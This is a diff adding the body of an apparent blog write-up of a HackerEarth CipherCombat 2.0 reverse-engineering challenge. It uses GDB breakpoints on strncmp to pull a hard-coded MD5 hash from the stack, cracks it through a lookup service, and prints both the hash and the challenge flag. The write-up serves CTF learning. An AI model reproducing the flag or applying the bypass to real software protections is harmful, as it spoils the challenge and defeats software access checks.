+<p>Let’s have a look at GDB disassembly…</p>
+
+<p><img src="https://miro.medium.com/max/1368/1*lNZuiBDzkNvgSrHube7sgA.png" alt="" /></p>
+
+<p>We can see that string compare function is at *main+186 so we will put break point there.</p>
+
+<p><img src="https://miro.medium.com/max/1400/1*nmAFCPnQbBwgoA-1C2Jhuw.png" alt="" /></p>
+
+<p><img src="https://miro.medium.com/max/766/1*6qb-pH2gzMPvaOLQhj3dtA.png" alt="" /></p>
+
+<p>Now let’s run the program and provide random input.</p>
+
+<p><img src="https://miro.medium.com/max/1400/1*6ad6Uix5zcBN7SQhMBWVhw.png" alt="" /></p>
+
+<p>We hit our breakpoints ! Let’s check registers, STRNCMP compares values stored in <strong>[R/ESI]</strong> with <strong>[R/EDI]</strong>…</p>
+
+<p><img src="https://miro.medium.com/max/1400/1*GEzuZe_tObGW6OpVnaz-Dg.png" alt="" /></p>
+
+<p>So get address of our hard-coded hash loaded in stack, lets check it out how it’s doing.</p>
+
+<p><img src="https://miro.medium.com/max/1400/1*4ESNSFiNrykRXxfoo0mZ7w.png" alt="" /></p>
+
+<p>And we get our values now let’s reconstruct the MD5</p>
+
+<p>Remember about LSB? these values are stored like that, we need to convert it into MSB and then we can continue.</p>
+
+<p>Copy the values in any text editor and rearrange them as following…</p>
+
+<p><img src="https://miro.medium.com/max/1400/1*6W3H0okjKG1LlN5e5bNaFg.png" alt="" /></p>
+
+<p>so at last we have our hash : <strong>53a167c8d4dc964f7d7838dd4ce2d137</strong></p>
+
+<p>Only thing left to do is brute force it, we can use online services, the one I used and which they later provided in their free hint is https://hashes.org/</p>
+
+<p><img src="https://miro.medium.com/max/1400/1*l3Cq8Jw-b3GGG3qS3V3REw.png" alt="" /></p>
+
+<p>And we have our flag :<strong><em>HE{iamalmighty9}</em></strong></p>
+
+<p><img src="https://miro.medium.com/max/988/1*K7A9d8L1oQ5QBzLxV6Ngkw.png" alt="" /></p>
+
+<p>&lt; And here is a cross check with the challenge binary.</p>
+
+<p>Another Fun challenge! Done.</p>
+
+<blockquote>
+  <p>NOTE: we could have done it in 3–4 less steps by just converting the strings found in <strong>MOVABS</strong> instructions,</p>
+</blockquote>
+
+<p><img src="https://miro.medium.com/max/1400/1*8RgD9zk0eJD2S6szrk-1Dg.png" alt="" /></p>
+
+<p>But what’s the fun in that, also i wanted to show you the dynamic analysis path. :-)</p>
+
+<hr />
 
     
 
@@ -485,8 +1280,6 @@ Reverse Engineering Challenge of Hacker Earth CipherCombat2.0
       
       
 
-      
-        <a href="/2020/04/13/CipherCombat2-Digest.html">More &hellip;</a>
       
     
   </article>
